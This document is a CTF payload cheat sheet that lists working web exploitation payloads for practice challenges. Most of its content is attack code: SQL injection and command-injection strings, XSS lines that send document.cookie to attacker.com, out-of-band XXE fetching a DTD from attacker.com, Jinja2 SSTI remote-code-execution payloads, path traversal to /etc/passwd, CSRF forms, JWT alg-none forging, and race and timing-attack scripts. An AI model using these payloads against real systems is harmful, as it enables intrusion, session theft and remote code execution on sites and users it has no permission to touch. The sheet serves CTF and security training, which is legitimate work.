# CTF Payload Cheat Sheet

Quick reference for common exploitation payloads used in these challenges.

## 🔴 SQL Injection

### Basic Authentication Bypass
```sql
' OR '1'='1' --
' OR 1=1 --
admin' --
admin' #
' OR 'a'='a
```

### Union-Based SQLi
```sql
' UNION SELECT NULL,NULL,NULL --
' UNION SELECT username,password FROM users --
```

### Blind SQLi (Boolean-Based)
```sql
' OR (SELECT SUBSTR(value,1,1) FROM secrets)='F' --
' AND 1=1 --  (true)
' AND 1=2 --  (false)
```

### Time-Based Blind SQLi
```sql
' OR SLEEP(5) --
' AND (SELECT SLEEP(5) FROM users WHERE username='admin') --
```

## 🟠 Cross-Site Scripting (XSS)

### Basic XSS
```html
<script>alert(1)</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### Cookie Stealing
```html
<script>fetch('http://attacker.com/?c='+document.cookie)</script>
<img src=x onerror="fetch('http://attacker.com/?c='+document.cookie)">
```

### Bypass Filters
```html
<ScRiPt>alert(1)</sCrIpT>
<img src=x onerror="alert(1)">
<svg/onload=alert(1)>
<iframe src="javascript:alert(1)">
```

## 🟡 Path Traversal

### Basic Traversal
```
../../../etc/passwd
..\..\..\..\windows\system32\config\sam
```

### URL Encoded
```
..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd
```

### Null Byte (older systems)
```
../../../etc/passwd%00
```

## 🟢 JWT Manipulation

### Algorithm Confusion (None)
```json
Header: {"alg":"none","typ":"JWT"}
Payload: {"sub":"admin","role":"admin"}
Token: eyJhbGc...eyJzdWI...
```

### Python Script
```python
import base64, json

def base64url(data):
    return base64.urlsafe_b64encode(data.encode()).decode().rstrip('=')

h = base64url('{"alg":"none","typ":"JWT"}')
p = base64url('{"sub":"admin","role":"admin"}')
token = f"{h}.{p}."
```

## 🔵 XXE (XML External Entity)

### Basic File Read
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### Read Flag
```xml
<?xml version="1.0"?>
<!DOCTYPE products [
  <!ENTITY xxe SYSTEM "file:///app/flag.txt">
]>
<products>
  <name>&xxe;</name>
</products>
```

### Out-of-Band XXE
```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
```

## 🟣 Server-Side Template Injection (SSTI)

### Jinja2 (Python/Flask)
```jinja2
{{7*7}}
{{config}}
{{config['FLAG']}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

### RCE Payloads
```jinja2
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /etc/passwd').read() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('whoami').read() }}
```

## 🟤 CSRF (Cross-Site Request Forgery)

### Auto-Submit Form
```html
<html>
<body>
<form id="csrf" action="http://target.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="9000">
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

### Image Tag (GET requests)
```html
<img src="http://target.com/transfer?to=attacker&amount=9000">
```

## ⚫ GraphQL

### Introspection Query
```graphql
{
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}
```

### IDOR Query
```graphql
{
  user(id: 1) {
    id
    username
    email
    secret
  }
}
```

### Batch Query
```graphql
{
  user1: user(id: 1) { username secret }
  user2: user(id: 2) { username secret }
  user3: user(id: 3) { username secret }
}
```

## 🔴 File Upload Bypass

### Double Extension
```
shell.php.jpg
shell.php.png
shell.jsp.jpg
```

### Content-Type Manipulation
```http
Content-Type: image/jpeg
(but upload .php file)
```

### Magic Bytes
```
Add GIF89a or PNG header to PHP file
```

### Null Byte (older systems)
```
shell.php%00.jpg
```

## 🟠 Race Condition

### Python Script
```python
import threading, requests

url = "http://target.com/redeem"
session = requests.Session()

def exploit():
    session.post(url)

threads = [threading.Thread(target=exploit) for _ in range(10)]
for t in threads: t.start()
for t in threads: t.join()
```

### Bash Script
```bash
for i in {1..10}; do
  curl -X POST http://target.com/redeem &
done
wait
```

## 🟡 Timing Attack

### Python Script
```python
import requests, time, string

url = "http://target.com/validate"
key = ""
charset = "0123456789abcdef"

for pos in range(10):
    timings = {}
    for char in charset:
        test = key + char + "0" * (9 - pos)
        start = time.time()
        requests.post(url, data={"key": test})
        timings[char] = time.time() - start
    
    key += max(timings, key=timings.get)
    print(f"Key: {key}")
```

## 🟢 IDOR (Insecure Direct Object Reference)

### URL Manipulation
```
/user/1
/note/3
/api/flag?uid=1
/document?id=100
```

### Cookie/Header Manipulation
```http
Cookie: user_id=1
X-User-ID: 1
Authorization: Bearer [token_with_admin_id]
```

## 🔵 Parameter Tampering

### URL Parameters
```
?role=admin
?admin=true
?isAdmin=1
?user_type=administrator
```

### Hidden Form Fields
```html
<input type="hidden" name="price" value="0.01">
<input type="hidden" name="role" value="admin">
<input type="hidden" name="discount" value="100">
```

## 🟣 Cookie Manipulation

### Browser DevTools
```
1. F12 → Application → Cookies
2. Edit cookie value
3. Refresh page
```

### curl
```bash
curl -H "Cookie: role=admin; user=alice" http://target.com/
```

### Python
```python
import requests
cookies = {'role': 'admin', 'user': 'alice'}
requests.get('http://target.com/', cookies=cookies)
```

## 🟤 Information Disclosure

### Common Files
```
/robots.txt
/.git/
/.env
/backup/
/.DS_Store
/config.php.bak
/web.config
/.htaccess
```

### Directory Listing
```
/admin/
/backup/
/uploads/
/files/
```

## ⚫ Password Reset Bypass

### Predictable Tokens
```
username + year (alice2024)
username + 123 (alice123)
MD5(username)
```

### Token Reuse
```
Use same token multiple times
Use token for different user
```

## 🔴 Command Injection

### Basic
```bash
; ls
| whoami
& cat /etc/passwd
`id`
$(whoami)
```

### Bypass Filters
```bash
cat</etc/passwd
cat${IFS}/etc/passwd
c'a't /etc/passwd
```

## 🟠 Encoding Tricks

### URL Encoding
```
%20 = space
%2F = /
%3C = <
%3E = >
```

### Double Encoding
```
%252F = %2F = /
%253C = %3C = <
```

### Base64
```bash
echo "admin' --" | base64
YWRtaW4nIC0tCg==
```

## 🟡 Useful curl Commands

### POST Request
```bash
curl -X POST -d "username=admin&password=pass" http://target.com/login
```

### With Cookies
```bash
curl -b "session=abc123" http://target.com/dashboard
```

### Save Cookies
```bash
curl -c cookies.txt -d "user=admin&pass=pass" http://target.com/login
curl -b cookies.txt http://target.com/dashboard
```

### Custom Headers
```bash
curl -H "Authorization: Bearer token123" http://target.com/api
```

### Timing
```bash
time curl -X POST -d "key=test" http://target.com/
```

## 🟢 Burp Suite Tips

### Repeater
```
Ctrl+R - Send to Repeater
Ctrl+Space - Send request
Ctrl+Shift+R - Change request method
```

### Intruder
```
1. Highlight payload position
2. Click "Add §"
3. Set payload type
4. Start attack
```

### Decoder
```
Ctrl+Shift+D - Open Decoder
Encode/Decode: Base64, URL, HTML, etc.
```

## 🔵 Python Requests Template

```python
import requests

# Session (maintains cookies)
s = requests.Session()

# Login
r = s.post('http://target.com/login', data={
    'username': 'admin',
    'password': 'password'
})

# Authenticated request
r = s.get('http://target.com/dashboard')

# With custom headers
headers = {'Authorization': 'Bearer token123'}
r = s.get('http://target.com/api', headers=headers)

# JSON request
r = s.post('http://target.com/api', json={
    'query': '{ user(id: 1) { secret } }'
})

print(r.text)
print(r.json())
```

---

## 📝 Notes

- Always test on systems you own or have permission to test
- Start with simple payloads and escalate
- Use encoding when special characters are filtered
- Check response codes, timing, and error messages
- Document your findings

**Happy Hacking! 🚩**
